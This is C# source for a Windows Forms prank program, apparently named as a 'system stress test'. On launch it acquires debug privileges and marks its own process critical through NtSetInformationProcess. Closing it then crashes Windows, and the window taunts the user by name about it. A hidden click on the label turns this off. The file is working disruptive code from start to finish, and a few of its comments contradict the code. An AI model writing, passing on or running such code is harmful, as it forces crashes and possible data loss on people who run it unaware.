using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Media;

namespace SystemStressTest
{
    public partial class Form1 : Form
    {

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

        public Form1()
        {
            InitializeComponent();


            //Get Username
            string userName = Environment.UserName;
            label1.Text = "Hello " + userName + " don't close me or your system will crash >:)";

            //Set Program to crash when closed
            //Do not touch
            int isCritical = 1;  // we want this to be a Critical Process
            int BreakOnTermination = 0x1D;  // value for BreakOnTermination (flag)

            Process.EnterDebugMode();  //acquire Debug Privileges

            // setting the BreakOnTermination = 1 for the current process
            NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
        }

        private void button1_Click(object sender, EventArgs e)
        {
            
            //Messgae Box
            MessageBox.Show("I will just sit here. You can close this screen safely. But don't close my main screen! >:)");
            button1.Enabled = false;

        }

        private void label1_Click(object sender, EventArgs e)
        {
            int isCritical = 0;  // we want this to be a Critical Process
            int BreakOnTermination = 0x1D;  // value for BreakOnTermination (flag)

            Process.EnterDebugMode();  //acquire Debug Privileges

            // setting the BreakOnTermination = 1 for the current process
            NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
            SoundPlayer audio = new SoundPlayer(SystemStressTest.Properties.Resources.Wheatley_Clever); // here WindowsFormsApplication1 is the namespace and Connect is the audio file name
            audio.Play();
            MessageBox.Show("You have disabled me successfully. You can now safely close me. :(");
            label1.Text = ":(";
        }
    } 
}
